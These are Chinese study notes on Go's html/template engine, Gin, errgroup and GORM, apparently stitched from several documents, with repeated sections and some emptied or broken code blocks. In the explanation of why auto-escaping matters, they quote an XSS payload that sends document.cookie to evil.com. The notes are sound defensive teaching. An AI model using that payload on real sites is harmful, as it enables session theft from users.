// 默认：自动转义 HTML
// 传入 <script>alert('xss')</script> → 输出 &lt;script&gt;...

// 关闭转义（慎用！仅信任内容来源时）
safeFunc := func(s string) template.HTML {
    return template.HTML(s)
}
tmpl.Funcs(template.FuncMap{"safe": safeFunc})
// 模板中使用：{{ .Content | safe }}
```

---

## 四、对比表格

### 4.1 模板引擎对比

| 对比项 | html/template (Go) | Jinja2 (Python) | EJS (JavaScript) | Vue.js |
|--------|---------------------|--------------------|--------------------|--------|
| 语言生态 | Go 标准库 | Python | Node.js | 前端框架 |
| 自动转义 | 默认开启 | 默认开启 | 不开启 | 默认开启 |
| 模板继承 | block 机制 | extends + block | 无原生支持 | 组件化 |
| 自定义函数 | Funcs 注册 | 自定义过滤器 | 自定义函数 | 方法/计算属性 |
| 学习曲线 | 低 | 低 | 低 | 中 |
| 服务端渲染 | 原生支持 | 原生支持 | 原生支持 | 需 Nuxt.js |
| 响应式 | 无 | 无 | 无 | 有 |
| 适用场景 | Go 后端 SSR | Python 后端 | Node.js 后端 | 前端 SPA/SSR |

### 4.2 三种上下文切换对比

| 语法 | 是否切换 `.` | 是否输出 | 典型场景 |
|------|-------------|----------|----------|
| `if` | ❌ 不切换 | 条件输出 | 判断是否显示某区块 |
| `range` | ✅ 切换成当前元素 | 循环输出 | 遍历列表 |
| `with` | ✅ 切换成指定值 | 条件输出 | 简化深层字段访问 |

**记忆口诀：** `if` 只管判断，`range` 遍历切换，`with` 简化访问。

---

## 五、坑 & 边界（重点）

### 5.1 define 命名冲突（全局命名空间）

**现象：** 访问 `/about` 页面却显示了 `/` 的内容。

**根因：** `define` 是**全局命名空间**。多个模板文件定义同名 `define`，后加载的会覆盖先加载的。

```go
// 危险：多个 handler 共用同一个全局 tmpl 对象
var tmpl = template.Must(template.ParseGlob("./templates/*.tmpl"))

// 正确：每个 handler 只解析自己需要的文件
func homeHandler(w http.ResponseWriter, r *http.Request) {
    tmpl, err := template.ParseFiles("./templates/base.tmpl", "./templates/home.tmpl")
    // ...
}

func aboutHandler(w http.ResponseWriter, r *http.Request) {
    tmpl, err := template.ParseFiles("./templates/base.tmpl", "./templates/about.tmpl")
    // ...
}
```

### 5.2 引用名必须等于文件名（含后缀）

```go
// base.tmpl 文件存在
// 模板中写：{{ template "base.html" }}  ← 错误！文件名是 .tmpl 不是 .html
// 正确：{{ template "base.tmpl" }}
```

### 5.3 block 必须传参数

```go
// 错误
{{ block "content" }}
    ...
{{ end }}

// 正确（必须传 . 作为参数）
{{ block "content" . }}
    ...
{{ end }}
```

### 5.4 字段可见性（Go 导出规则）

**模板中只能访问大写字段开头的字段（Go 的导出规则）：**

```go
type User struct {
    Name string   // ✅ 模板可访问
    age  int      // ❌ 模板无法访问（未导出）
}
```

### 5.5 Funcs 注册顺序

```go
// 错误：Funcs 放在 Parse 之后
tmpl, err := template.New("hello").ParseFiles("./hello.html")
tmpl.Funcs(template.FuncMap{"kua": kua})  // 无效！解析时函数还未注册

// 正确：Funcs 放在 Parse 之前
tmpl, err := template.New("hello").
    Funcs(template.FuncMap{"kua": kua}).
    ParseFiles("./hello.html")
```

### 5.6 零值判断边界

```go
// if 的零值判断：以下值都算 false
// 0, "", nil, 空切片[]T{}, 空map map[K]V{}

{{ if .Count }}    <!-- Count=0 时不输出 -->
    <p>有数据</p>
{{ end }}

{{ if .Name }}    <!-- Name="" 时不输出 -->
    <p>有名字</p>
{{ end }}
```

### 5.7 空值处理

| 场景 | 行为 |
|------|------|
| 数据是 `nil` | 输出 `<no value>` |
| 结构体不存在字段 | 运行时报错（panic） |
| 空切片 `range` | 什么都不输出 |
| 空切片 `range` + `else` | 执行 `else` 分支 |

---

## 六、原理追问

### 6.1 为什么 html/template 默认自动转义？

**安全设计哲学：** Web 第一安全威胁是 XSS（跨站脚本攻击）。如果不转义，用户在评论区输入 `<script>document.location='http://evil.com/?cookie='+document.cookie</script>`，所有访问该页面的用户 Cookie 都会被窃取。

`html/template` 自动把 `<` 转成 `&lt;`，`>` 转成 `&gt;`，脚本变成普通文字无法执行。

**设计取舍：** "安全是默认行为，关闭需显式声明"。相比 EJS（默认不转义，安全靠开发者自觉），Go 选择了更安全的默认策略。

### 6.2 为什么 define 是全局命名空间？

**设计取舍：** 模板引擎的设计目标是"简单"。如果 `define` 支持局部作用域，就需要引入命名空间、导入系统、作用域链……复杂度飙升。

Go 选择了"全局 + 覆盖"的简单模型。代价是多个文件定义同名块会冲突，但解决办法很简单：每个 handler 只加载自己需要的模板文件。

### 6.3 为什么 range 内部 `.` 会切换？

**设计动机：** `range` 的本质是"迭代"。如果 `.` 不切换成当前元素，你就没法直接访问当前迭代项，每次都要写 `{{ index $.Users $i }}`，非常冗长。

Go 的设计是：`range` 内部 `.` 切换成当前元素，外层数据用 `$` 访问。这是**易用性优先**的设计——大多数循环场景都需要访问当前元素。

### 6.4 为什么模板解析要在请求外提前做？

**性能设计：** `template.ParseFiles` 会做词法分析、语法分析、AST 构建、字节码编译——这是一组昂贵操作。

正确做法是在 `main()` 或 `init()` 中预解析模板，请求时只执行 `Execute`（轻量替换操作）：

```go
var tmpl *template.Template

func init() {
    tmpl = template.Must(template.ParseFiles("base.tmpl", "index.tmpl"))
}

func handler(w http.ResponseWriter, r *http.Request) {
    tmpl.Execute(w, data)  // 轻量执行
}
```

---

## 七、知识全景

### 7.1 模板引擎在 Go 生态中的位置

```
Go Web 应用
    │
    ├─ API 服务（JSON 响应） → 不需要模板引擎
    │   └─ Gin + JSON 序列化
    │
    ├─ 服务端渲染网页 → html/template
    │   ├─ 简单页面：html/template（标准库）
    │   └─ 复杂页面：考虑前端框架（Vue/React）+ API
    │
    └─ 邮件模板 → html/template
        └─ 用 text/template（纯文本版本）
```

### 7.2 html/template vs text/template

| 对比项 | html/template | text/template |
|--------|--------------|--------------|
| 自动转义 | HTML 转义 | 无转义 |
| 适用场景 | HTML 页面 | 纯文本（邮件、SQL、配置文件） |
| API | 完全相同 | 完全相同 |

**选择规则：** 输出 HTML 用 `html/template`，输出纯文本用 `text/template`。API 完全一致，只需换 import 路径。

### 7.3 后续扩展方向

- 模板缓存策略（多 goroutine 安全加载）
- 模板性能调优（`template.Parse` vs `template.Must`）
- 与前端框架的协作模式（BFF 架构）
- 邮件模板生成（`text/template` + SMTP）
- 代码生成器（用 template 生成 CRUD 代码）

---

# 附录：Go 后端开发知识全景

## 技术栈全景图

```
┌─────────────────────────────────────────────────────────────┐
│                      Go 后端技术栈                           │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │  Gin     │  │  GORM    │  │template  │  │ errgroup │   │
│  │  路由/中间件│ │  ORM/迁移 │  │ 模板渲染  │  │ 并发控制  │   │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘   │
│       │              │             │             │           │
│       └──────────────┴─────────────┴─────────────┘           │
│                              │                               │
│                              ▼                               │
│                    ┌──────────────────┐                      │
│                    │  MySQL / PG /    │                      │
│                    │  SQLite          │                      │
│                    └──────────────────┘                      │
└─────────────────────────────────────────────────────────────┘
```

## 核心坑位速查表

| 组件 | 坑位 | 严重程度 | 一句话解决 |
|------|------|----------|-----------|
| Gin | 多端口阻塞 | 高 | 多引擎 + errgroup |
| Gin | goroutine + Context | 高危 | 提前取值或 c.Copy() |
| Gin | c.Abort() 后没 return | 中 | 黄金组合：JSON + Abort + return |
| Gin | log.Fatal 在 Handler 中 | 高 | 启动阶段用 Fatal，业务层用 Error |
| GORM | 链式复用污染 | 高危 | 即用即拼，或用 Session |
| GORM | AutoMigrate 不删列 | 中 | 生产用迁移脚本 |
| GORM | 业务错误用 log.Fatal | 高 | errors.Is + ErrRecordNotFound |
| GORM | DSN 漏参数 | 高 | utf8mb4 + parseTime + loc |
| 模板 | define 命名冲突 | 中 | 每个 handler 独立 Parse |
| 模板 | Funcs 放 Parse 后 | 中 | Funcs 必须在 Parse 前 |
| 模板 | 小写字段访问不到 | 中 | 首字母大写 |
| 通用 | int/uint 混用 | 中 | 显式转换 |

## errgroup vs WaitGroup 对比

| 能力 | sync.WaitGroup | errgroup.Group |
|------|----------------|----------------|
| 等待结束 | ✅ | ✅ |
| 收集错误 | ❌ | ✅ 返回第一个错误 |
| Context 取消 | ❌ | ✅ 可用 WithContext |

## int vs uint 类型选型

| 类型 | 取值范围 | 说明 |
|------|----------|------|
| `int` | 可正、可负、可为 0 | 日常首选 |
| `uint` | >= 0 | 明确无负数时使用 |
| `int64` | 固定 64 位有符号 | 跨平台更稳定 |
| `uint64` | 固定 64 位无符号 | 大 ID、计数 |

**注意：** `int` 和 `uint` 不能直接混用，需要显式转换。`uint(-1)` 不会得到 `-1`，而会变成很大的无符号值。

## log.Print / Panic / Fatal 行为对照表

| 函数 | 行为 | 是否退出 | 是否执行 defer | 能否 recover |
|------|------|----------|---------------|-------------|
| `log.Print` | 打印日志 | 否 | 是 | — |
| `log.Panic` | 打印 + panic | 否 | 是 | 能 |
| `log.Fatal` | 打印 + `os.Exit(1)` | 是 | 否 | 否 |

**规则：** `log.Fatal` 适合启动阶段失败；不适合业务 handler 里的普通错误。Gin 的 `Recovery` 中间件能捕获 panic，但不能阻止 `log.Fatal` 退出。
## 1. 宏观体系

### 1.1 学科定位

Go 后端开发的核心链路：

```text
HTTP 请求接入 → 业务处理 → 数据持久化
```

| 层级 | 技术 | 职责 |
| ------ |------ |------ |
| 接入层 | Gin | 接收请求、路由分发、参数解析、响应渲染 |
| 业务层 | Go 代码 | 业务逻辑、并发控制、错误处理 |
| 持久层 | GORM + MySQL | 数据存储、查询、事务 |

### 1.2 模块关系

```text
客户端请求
    │
    ▼
[Gin 接入层]    ← 路由、参数、中间件
    │
    ▼
[Go 业务层]     ← 逻辑、并发（errgroup）、日志（log）
    │
    ▼
[GORM 持久层]   ← 模型映射、CRUD
    │
    ▼
[MySQL 数据库]
```

一句话：Gin 负责“接客”，GORM 负责“存取”，MySQL 是“仓库”。

## 2. Gin 框架

### 2.1 引擎 Engine

`gin.Engine` 是 Gin 的核心对象，负责路由注册、中间件管理和请求分发。

```go
r := gin.Default()
r.GET("/ping", handler)
r.Run(":8080")
```

**边界：** 一个 `*gin.Engine` 实例通常只监听一个端口。要监听多个端口，需要创建多个独立引擎。

**坑：** 误以为同一个 `r` 可以多次调用 `r.Run()` 监听不同端口。`r.Run()` 是阻塞调用，第二个 `r.Run()` 通常不会被执行到。

```go
r := gin.Default()
r.Run(":8080") // 阻塞
r.Run(":8081") // 通常执行不到
```

### 2.2 gin.Default() vs gin.New()

| 对比项 | gin.Default() | gin.New() |
| ------ |------ |------ |
| Logger 中间件 | 自带 | 无 |
| Recovery 中间件 | 自带 | 无 |
| 适用场景 | 日常开发 | 需要精细控制中间件 |

**边界：** `gin.Default()` 自带的 `Recovery` 能捕获 handler 里的 panic 并返回 500，但不能阻止 `log.Fatal` 直接退出程序。

### 2.3 路由

```go
r.GET("/user", getUser)
r.POST("/user", createUser)
r.PUT("/user/:id", updateUser)
r.DELETE("/user/:id", deleteUser)
```

#### 路由组

```go
api := r.Group("/api/v1", AuthMiddleware())
{
    api.GET("/users", listUsers)
    api.GET("/articles", listArticles)
}
```

**坑：** 组前缀不要和内部路径重复，否则会出现 `/admin/admin` 这类双前缀路径。

#### 路由优先级

```text
静态路径 > 参数节点 :name > 通配节点 *path
```

```go
r.GET("/user/detail", h1)   // 优先匹配
r.GET("/user/:name", h2)    // 兜底
```

访问 `/user/detail` 走 `h1`；访问 `/user/张三` 走 `h2`。

**坑：** 重复注册会 panic。

```go
r.GET("/test", h1)
r.Any("/test", h2) // panic: handlers are already registered
```

兜底：

| 方法 | 触发时机 | 常用状态码 |
| ------ |------ |------ |
| `r.NoRoute` | 路径没匹配到 | 404 |
| `r.NoMethod` | 路径匹配但方法不对 | 405 |

### 2.4 参数处理

| 来源 | 位置 | 读取方法 |
| ------ |------ |------ |
| Query | URL `?key=value` | `c.Query("key")` |
| Form | 请求体 | `c.PostForm("key")` |
| Path | URL 路径段 | `c.Param("key")` |

带默认值版本：`c.DefaultQuery`、`c.DefaultPostForm`。

#### ShouldBind

```go
type LoginForm struct {
    Username string `form:"username" binding:"required,min=3,max=20"`
    Email    string `form:"email" binding:"required,email"`
}

if err := c.ShouldBind(&form); err != nil {
    c.JSON(400, gin.H{"err": err.Error()})
    return
}
```

**坑：**

- 结构体字段首字母必须大写。
- 必须传指针 `&form`。
- 常用 tag：`required`、`email`、`min`、`max`、`gt`、`lt`、`oneof`。

### 2.5 中间件

```go
func LogMiddleware(c *gin.Context) {
    fmt.Println("请求开始:", c.Request.URL.Path)
    c.Next()
    fmt.Println("请求结束:", c.Request.URL.Path)
}
```

| 方法 | 作用 |
| ------ |------ |
| `c.Next()` | 继续执行后续中间件和处理函数 |
| `c.Abort()` | 中断后续执行 |

**坑：** 只写 `c.Abort()` 不写 `return`，后面的代码仍会执行。

**黄金组合：**

```go
c.JSON(401, ...)
c.Abort()
return
```

#### 中间件中使用 goroutine

**坑：** 不能在 goroutine 里直接使用 `c`，因为 Gin 会复用 `gin.Context`。

安全写法：

```go
path := c.Request.URL.Path
go func(p string) {
    // 使用 p
}(path)
```

或者：

```go
cCp := c.Copy()
go func() {
    fmt.Println(cCp.Request.URL.Path)
}()
```

**边界：** `c.Copy()` 返回的是副本，不能用来写响应，也不能调用 `Next()` / `Abort()`。

### 2.6 响应渲染

```go
c.JSON(200, gin.H{"code": 0, "msg": "ok"})
```

| 方法 | 特点 |
| ------ |------ |
| `c.JSON` | HTML 特殊字符会转义 |
| `c.PureJSON` | 不转义，返回原始字符 |

**坑：** `c.JSON` 之后通常要 `return`，否则后续代码可能触发重复写响应头。

### 2.7 文件上传

```go
r.POST("/upload", func(c *gin.Context) {
    file, err := c.FormFile("avatar")
    if err != nil {
        c.JSON(400, gin.H{"err": err.Error()})
        return
    }
    dst := filepath.Join("./uploads", filepath.Base(file.Filename))
    c.SaveUploadedFile(file, dst)
})
```

**坑：**

- 前端 `<form>` 必须写 `enctype="multipart/form-data"`。
- 前端 `name` 和后端 `c.FormFile` 参数必须一致。
- 文件名建议用 `filepath.Base` 防止路径穿越。

## 3. 并发服务管理：errgroup

### 3.1 为什么需要 errgroup

`r.Run()` 是阻塞调用，第二个服务无法直接启动：

```go
r1.Run(":8080") // 阻塞
r2.Run(":8081") // 通常执行不到
```

朴素方案：

```go
go r1.Run(":8080")
go r2.Run(":8081")
select {}
```

问题：看不到服务启动失败的错误。

### 3.2 推荐写法

```go
var g errgroup.Group

g.Go(func() error {
    return r1.Run(":8080")
})

g.Go(func() error {
    return r2.Run(":8081")
})

if err := g.Wait(); err != nil {
    log.Fatal(err)
}
```

### 3.3 errgroup vs WaitGroup

| 能力 | sync.WaitGroup | errgroup.Group |
| ------ |------ |------ |
| 等待结束 |  |  |
| 收集错误 |  | 返回第一个错误 |
| Context 取消 |  | 可用 `WithContext` |

**坑：** 必须用 `g.Wait()` 阻塞主 goroutine，否则主程序退出后所有服务会被强制终止。

### 3.4 两个服务为什么能返回不同内容

根本原因：**两个独立 engine + 两个不同 handler**。

- `r1` 和 `r2` 是两个独立实例，各自有自己的路由表。
- 请求 `8080` 走 `r1` 的 handler。
- 请求 `8081` 走 `r2` 的 handler。

**反例：** 同一个 `r` 不能同时监听两个端口，也不能靠同一个 engine 返回两套完全不同的根路由响应。

## 4. 数据库基础：SQL vs MySQL

| 概念 | 定义 | 类比 |
| ------ |------ |------ |
| SQL | 查询语言 | 普通话 |
| MySQL | 数据库软件 | 使用普通话的人 |

MySQL、PostgreSQL、SQLite、Oracle 等都支持 SQL。

**学习顺序建议：**

1. 先学 SQL 基础：`SELECT`、`INSERT`、`UPDATE`、`DELETE`。
2. 再装 MySQL，本地运行一个数据库实例。
3. 最后接 GORM，用 Go 代码操作 MySQL。

**坑：** 不要死磕完全部 SQL 理论再学 GORM。GORM 的每条操作背后都对应 SQL，遇到不懂的再查效率更高。

## 5. GORM

### 5.1 连接数据库

DSN 示例：

```text
root:123456@tcp(127.0.0.1:3306)/gorm_learn?charset=utf8mb4&parseTime=True&loc=Local
```

| 参数 | 作用 | 漏了会怎样 |
| ------ |------ |------ |
| `charset=utf8mb4` | 支持中文和 emoji | 中文可能乱码 |
| `parseTime=True` | 时间转 `time.Time` | 时间字段可能变成 `[]byte` |
| `loc=Local` | 使用本地时区 | 时区可能错误 |

```go
dsn := "root:123456@tcp(127.0.0.1:3306)/gorm_learn?charset=utf8mb4&parseTime=True&loc=Local"
db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
if err != nil {
    log.Fatal("连接失败: ", err)
}
```

**坑：**

- `Access denied`：用户名或密码错误。
- `Unknown database`：数据库不存在。
- `connection refused`：MySQL 未启动。

### 5.2 模型定义

```go
type User struct {
    gorm.Model
    Name string
}
```

`gorm.Model` 包含：

| 字段 | 作用 |
| ------ |------ |
| `ID` | 主键，自增 |
| `CreatedAt` | 创建时间 |
| `UpdatedAt` | 更新时间 |
| `DeletedAt` | 软删除 |

常用 tag：

```go
gorm:"primaryKey"
gorm:"type:varchar(50)"
gorm:"not null"
gorm:"uniqueIndex"
gorm:"default:0"
```

**坑：**

- tag 必须用反引号 ```。
- `primaryKey` 的 `K` 必须大写。
- `uint` 不要拼成 `unit`。

### 5.3 自动建表

```go
db.AutoMigrate(&User{})
```

| 行为 | 说明 |
| ------ |------ |
| 幂等 | 反复调用不会重复建表 |
| 只增不删 | 新增字段会加列，删除字段不会删列 |
| 不改类型 | 字段类型变化不会自动修改 |

**坑：** 必须传指针 `&User{}`，不能传值 `User{}`。

## 6. 类型选型：int、uint

| 类型 | 取值范围 | 说明 |
| ------ |------ |------ |
| `int` | 可正、可负、可为 0 | 日常首选 |
| `uint` | ≥ 0 | 明确无负数时使用 |
| `int64` | 固定 64 位有符号 | 跨平台更稳定 |
| `uint64` | 固定 64 位无符号 | 大 ID、计数 |

**坑：** `int` 和 `uint` 不能直接混用。

```go
var a int = 10
var b uint = 20
c := uint(a) + b // 必须显式转换
```

**边界：** `uint(-1)` 不会得到 `-1`，而会变成很大的无符号值。

GORM 主键常用 `uint`，因为主键通常是自增正整数；但如果需要与其他系统交互，主键用 `int64` 更稳妥。

## 7. 日志与程序退出

| 函数 | 行为 | 是否退出 | 是否执行 defer | 能否 recover |
| ------ |------ |------ |------ |------ |
| `log.Print` | 打印日志 | 否 | 是 | — |
| `log.Panic` | 打印 + panic | 否 | 是 | 能 |
| `log.Fatal` | 打印 + `os.Exit(1)` | 是 | 否 | 否 |

```go
if err := g.Wait(); err != nil {
    log.Fatal(err)
}
```

**坑：**

- `log.Fatal` 不会执行 `defer`。
- `log.Fatal` 不能被 `recover` 捕获。
- Gin 的 `Recovery` 中间件能捕获 panic，但不能阻止 `log.Fatal` 退出。

**适用边界：** `log.Fatal` 适合启动阶段失败；不适合业务 handler 里的普通错误。

## 8. 常见坑汇总

| 场景 | 坑 | 建议 |
| ------ |------ |------ |
| Gin 多端口 | 同一个 `r` 调两次 `r.Run()` | 用多个 `gin.Engine` |
| errgroup | 忘记 `g.Wait()` | 主 goroutine 会被提前退出 |
| ShouldBind | 传值不传指针 | 必须写 `&form` |
| 中间件 goroutine | 直接用 `c` | 用 `c.Copy()` 或提前取值 |
| GORM DSN | 漏写 `parseTime=True` | 时间字段读写异常 |
| AutoMigrate | 忘记 `&` | 必须传结构体指针 |
| log.Fatal | 用在业务错误里 | 会导致整个服务退出 |
| int/uint | 直接混用 | 需要显式转换 |

## 9. 后续可扩展方向

- 补充 GORM 连接 MySQL 的完整 CRUD 示例。
- 补充 errgroup 启动多 Gin 服务的可运行示例。
- 补充统一响应结构、错误码设计。
- 补充 JWT 鉴权、分页查询、日志中间件。
# Go 模板引擎完全教程

> 本文档系统整理 Go 语言 `html/template` 模板引擎的核心知识，涵盖：解决什么问题、核心机制、语法体系、复用方式、常见坑、边界情况、设计哲学与深度理解。

## 一、解决什么问题？

### 1.1 核心问题：动态生成 HTML

**没有模板引擎时：**
```go
html := "<h1>欢迎你，" + name + "</h1>"
w.Write([]byte(html))
- 字符串拼接，页面一复杂就乱。
- 前后端代码混在一起。
- 用户输入 `<script>` 会直接执行（XSS 攻击）。
``` 
**有了模板引擎：**
```
html
<h1>欢迎你，{{ .Name }}</h1>
页面结构和数据分离。
```

- 页面结构和数据分离。
- 自动转义危险字符。
- 模板可复用、可继承。

### 1.2 一句话总结
模板引擎 = 把“页面长什么样”和“数据是什么”分开，用占位符在中间搭桥。

---

## 二、核心逻辑与三步走

### 2.1 三步走
```text
定义模板 → 解析模板 → 渲染模板
（写文件） （加载进内存）（填数据、输出）
```

### 2.2 数据流向
```text
Go 数据（结构体/map）
        │
        ▼
   模板文件（含 {{ }} 占位符）
        │
        ▼
    渲染（用数据替换占位符）
        │
        ▼
  最终 HTML → 浏览器
```

### 2.3 核心概念对应

| 概念 | 作用 | 代码 |
|---|---|---|
| 模板文件 | 页面骨架 + 占位符 | `index.tmpl` |
| `.` | 当前数据对象 | `{{ .Name }}` |
| `ParseFiles` / `ParseGlob` | 加载模板 | `template.ParseFiles(...)` |
| `Execute` / `ExecuteTemplate` | 渲染并输出 | `tmpl.Execute(w, data)` |
| `define` | 定义可复用块 | `{{ define "content" }}...{{ end }}` |
| `block` | 定义块 + 引入块 | `{{ block "content" . }}{{ end }}` |
| `template` | 引入其他模板 | `{{ template "base.tmpl" }}` |

### 2.4 最小可用流程
```go
// 1. 解析模板
tmpl, err := template.ParseFiles("./index.tmpl")
if err != nil { return }

// 2. 准备数据
data := map[string]interface{}{"Name": "张三"}

// 3. 渲染到响应
tmpl.Execute(w, data)
```

### 2.5 带继承的流程
```text
base.tmpl（骨架，含 block "content"）
    ▲
    │ template 引用
    │
index.tmpl（定义 content）

执行：tmpl.ExecuteTemplate(w, "index.tmpl", data)
```

---

## 三、语法体系

### 3.1 语法速查

| 语法 | 作用 |
|---|---|
| `{{ . }}` | 打印当前数据 |
| `{{ .Field }}` | 访问字段 |
| `{{ $x := .Name }}` | 声明变量 |
| `{{ if pipeline }}...{{ end }}` | 条件 |
| `{{ range pipeline }}...{{ end }}` | 循环 |
| `{{ with pipeline }}...{{ end }}` | 切换上下文 |
| `{{/* 注释 */}}` | 注释 |
| `{{- ... -}}` | 去除空白 |
| `{{ printf "%s" .Name }}` | 函数调用 |
| `{{ .Name \| safe }}` | 管道 |

### 3.2 三种“切换上下文”的对比

| 语法 | 是否切换 `.` | 是否输出 | 典型场景 |
|---|---|---|---|
| `if` | ❌ 不切换 | 条件输出 | 判断是否显示 |
| `range` | ✅ 切换成当前元素 | 循环输出 | 遍历列表 |
| `with` | ✅ 切换成指定值 | 条件输出 | 简化深层字段访问 |

**记忆口诀：**
`if` 只管判断，`range` 遍历切换，`with` 简化访问。

### 3.3 变量与管道
```text
{{ $title := .Title }}          <!-- 声明变量 -->
{{ .Name | printf "%s真帅" }}    <!-- 管道：前一个结果传给后一个函数 -->
{{- .Name -}}                    <!-- 去除左右空白 -->
```

### 3.4 条件判断
```html
{{ if .Age }}
    
{{ else }}
    
{{ end }}
```
**零值判断规则：** `0`、`""`、`nil`、空切片/空 map 都算假。

### 3.5 遍历
```html
{{ range .Users }}
    
{{ else }}
    
{{ end }}
```
`range` 内部 `.` 是当前元素；外层数据用 `$` 访问。

### 3.6 with
```html
{{ with .User }}
    
    
{{ end }}
```
`with` 把 `.` 切换成 `.User`，内部直接写 `.Name`。

---

## 四、复用机制

### 4.1 两种复用层次

| 层次 | 语法 | 场景 |
|---|---|---|
| 片段复用 | `{{ template "xxx" }}` | 引入一个组件（导航、页脚） |
| 继承复用 | `{{ block "xxx" . }}` | 子模板覆盖父模板的某个区域 |

### 4.2 define + template

**同文件内：**
```html
{{ define "ol.tmpl" }}

{{ end }}

{{ template "ol.tmpl" }}
```

**外部文件：**
```html
<!-- ul.tmpl -->


<!-- t.tmpl -->
{{ template "ul.tmpl" }}
```

**解析时：**
```go
tmpl, err := template.ParseFiles("./t.tmpl", "./ul.tmpl")
```
> **注意：** 被引用的模板必须和主模板一起被解析。

### 4.3 block 模板继承

**base.tmpl：**
```html
<!DOCTYPE html>

```

**index.tmpl：**
```html
{{ template "base.tmpl" }}

{{ define "content" }}
    
{{ end }}
```

**渲染：**
```go
tmpl.ExecuteTemplate(w, "index.tmpl", nil)
```

---

## 五、自定义函数与安全

### 5.1 自定义函数

**定义：**
```go
kua := func(arg string) (string, error) {
    return arg + "真帅", nil
}
```

**注册：**
```go
tmpl, err := template.New("hello").
    Funcs(template.FuncMap{"kua": kua}).
    ParseFiles("./hello.html")
```

**使用：**
```html
{{ kua .Name }}
```

**规则：**
- 函数必须返回 1 个或 2 个值。
- 如果返回 2 个，第二个必须是 `error`。
- 注册必须在 `Parse` 之前。

### 5.2 html/template 的安全机制

`html/template` 会自动转义危险字符，防止 XSS 攻击。

**转义示例：**
- 传入 `<script>alert('xss')</script>`
- 渲染后变成 `&lt;script&gt;alert('xss')&lt;/script&gt;`

**关闭转义（慎用）：**
```go
tmpl, _ := template.New("xss.tmpl").Funcs(template.FuncMap{
    "safe": func(s string) template.HTML {
        return template.HTML(s)
    },
}).ParseFiles("./xss.tmpl")
```
```html
{{ . | safe }}
```
> **警告：** 只有完全信任内容来源时才能用 `safe`。

---

## 六、常见坑与边界

### 6.1 常见坑

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| `define` 命名冲突 | 访问 `/about` 却显示 `/` 的内容 | 多个文件定义同名 `define`，后加载的覆盖先加载的 | 每个 handler 用 `ParseFiles` 只加载自己需要的文件 |
| 引用名 ≠ 文件名 | `no such template "base.html"` | 文件叫 `base.tmpl`，引用写成了 `"base.html"` | 引用名 = 文件名（含后缀） |
| `block` 少传参数 | `wrong number of args for block` | 写成 `{{ block "content" }}`，漏了 `.` | `{{ block "content" . }}` |
| 字段小写访问不到 | `can't evaluate field name` | 结构体字段小写 | 字段首字母必须大写 |
| 出错没 return | 解析失败后 panic | 出错后没有 return，继续执行 | 错误检查后立刻 return |
| `Funcs` 放错位置 | 模板里函数未定义 | `Funcs` 放在了 `Parse` 后面 | `New().Funcs().Parse()` |

### 6.2 边界情况

| 边界 | 行为 |
|---|---|
| 数据是 `nil` | 输出 `<no value>` |
| 字段不存在 | 运行时报错 |
| 空切片 `range` | 什么都不输出（除非有 `else`） |
| 空切片 `range` + `else` | 执行 `else` 分支 |
| HTML 标签 | `html/template` 自动转义 |
| `{{ . }}` 打印结构体 | 输出 `{字段1 字段2}` 格式 |
| `{{ . }}` 打印 map | 输出 `map[key:value]` 格式 |

---

## 七、知识框架全景图

```text
┌─────────────────────────────────────────────────────────┐
│                    Go 模板引擎                            │
│                                                         │
│  ┌─────────────┐                                        │
│  │  为什么用    │  动态 HTML / 前后端分离 / 防 XSS        │
│  └──────┬──────┘                                        │
│         │                                               │
│  ┌──────▼──────┐                                        │
│  │  核心机制    │  定义 → 解析 → 渲染                     │
│  │             │  数据流：Go数据 → 模板 → HTML            │
│  └──────┬──────┘                                        │
│         │                                               │
│  ┌──────▼──────┐                                        │
│  │  语法体系    │                                        │
│  │             │                                        │
│  │  ┌────────┐ │  取值：{{.}}、{{.Field}}                │
│  │  │ 基础    │ │  变量：{{$x := ...}}                   │
│  │  └────────┘ │                                        │
│  │  ┌────────┐ │  条件：if                              │
│  │  │ 逻辑    │ │  循环：range                           │
│  │  └────────┘ │  上下文：with                          │
│  │  ┌────────┐ │  片段：template                        │
│  │  │ 复用    │ │  继承：block                           │
│  │  └────────┘ │  自定义：Funcs                          │
│  │  ┌────────┐ │  管道：|                               │
│  │  │ 进阶    │ │  空白：{{- -}}                         │
│  │  └────────┘ │  安全：自动转义 / safe                  │
│  └──────┬──────┘                                        │
│         │                                               │
│  ┌──────▼──────┐                                        │
│  │  约束与坑    │  全局命名空间 / 大小写 / 加载顺序        │
│  └──────┬──────┘                                        │
│         │                                               │
│  ┌──────▼──────┐                                        │
│  │  边界情况    │  nil / 空值 / 不存在字段 / 转义          │
│  └─────────────┘                                        │
└─────────────────────────────────────────────────────────┘
```

---

## 八、深度理解：三个“为什么”

### 8.1 为什么 html/template 要自动转义？
因为 Web 的第一安全威胁是 XSS（跨站脚本攻击）。

如果不转义，用户在评论区输入：
```html

所有访问这个页面的用户，cookie 都会被偷走。

`html/template` 自动把 `<` 转成 `&lt;`，脚本就变成普通文字，无法执行。

**安全是默认行为**，关闭它需要显式声明（`template.HTML`）。这是“安全优先”的设计哲学。

### 8.2 为什么 define 是全局的？
因为模板引擎的设计目标是“简单”。

如果 `define` 是局部的，就需要引入作用域、命名空间、导入系统……复杂度飙升。

Go 选择了“全局 + 覆盖”的简单模型。代价是：多个文件定义同名块会冲突。但这不是 bug，是设计取舍。

**解决办法：** 每个 handler 只加载自己需要的模板。

### 8.3 为什么 range 内部的 . 会变？
因为 `range` 的本质是“迭代”。

```text
{{ range .Users }}
    {{ . }}      ← 这里应该是“当前用户”，而不是“整个数据”
{{ end }}
```
如果 `.` 不变，你就没法直接访问当前元素，每次都要写 `{{ index $.Users $i }}`，非常难用。

所以 Go 设计成：`range` 内部 `.` 切换成当前元素，外层数据用 `$` 访问。

---

## 九、总结

Go 模板引擎的本质是“填空器”，设计哲学是“数据驱动 + 关注点分离”。核心机制是“定义→解析→渲染”三步。语法体系分四层：取值、逻辑、复用、进阶。所有约束和坑都源于“全局命名空间 + 运行时检查 + 安全优先”三大设计取舍。
